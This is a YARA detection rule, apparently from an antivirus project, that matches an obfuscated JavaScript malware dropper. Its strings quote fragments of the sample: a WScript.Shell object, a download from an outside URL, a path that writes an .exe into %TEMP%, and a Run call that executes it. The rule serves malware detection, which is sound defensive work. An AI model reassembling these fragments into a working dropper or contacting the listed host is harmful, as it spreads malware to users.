rule sig_20160328_acfc4d86ccee4382d58f64904d766258 {
  meta:
    description = "datamaliciousorder - file 20160328_acfc4d86ccee4382d58f64904d766258.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "720ba2e896556cff54a1ad50ed6ad8106043a10a03b28dd236dd6b720b583d75"

  strings:
    $s1  = "function Duauozhej() {return Xxuxmf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"uTDTzHVwEmkc7.exe\";};" fullword ascii
    $s2  = "do {WScript[Eqjdcxufky](Oqxhcz() * 11)} while (Vnbkh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Xxuxmf = function Fvbonpaz() {return WScript[Dedlybiyx](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Vnbkh[Wbwhrzpg](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "function Ljbjgaot(Nuywequc, Oplllmmqr){return Nuywequc - Oplllmmqr;};" fullword ascii
    $s6  = "function Ljyxsmi(Lkortzntbm){Xxuxmf[\"Run\"](Lkortzntbm, Iznogu, Iznogu);};" fullword ascii
    $s7  = "function Mppthtkb() {return ((Dsnsdwfu == true) && (Dsnsdwfu == Ngmgyktsso)) ? 1 : Iznogu;};" fullword ascii
    $s8  = "function Oxsss(Ixenbbh) {var Mmbbsa = (1, 2, 3, 4, 5, Ixenbbh); return Mmbbsa;};" fullword ascii
    $s9  = "var Fflbwtmy = new this[\"Date\"]();" fullword ascii
    $s10 = "var Ngmgyktsso = false;" fullword ascii
    $s11 = "Ngmgyktsso = true; " fullword ascii
    $s12 = "function Kaydmgo(){return Dedlybiyx;};" fullword ascii
    $s13 = "function Oqxhcz(){return 22;};" fullword ascii
    $s14 = "var Vgsgytzrx = false;" fullword ascii
    $s15 = "var Dsnsdwfu = false;" fullword ascii
    $s16 = "function Amighjhn()" fullword ascii
    $s17 = " while (Nxhwctdtnx){" fullword ascii
    $s18 = "function Uajtnetqh(){return Rdufh;};" fullword ascii
    $s19 = "Dsnsdwfu = true; " fullword ascii
    $s20 = "return Ljbjgaot(Nhtzahacw, Bhbcef);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}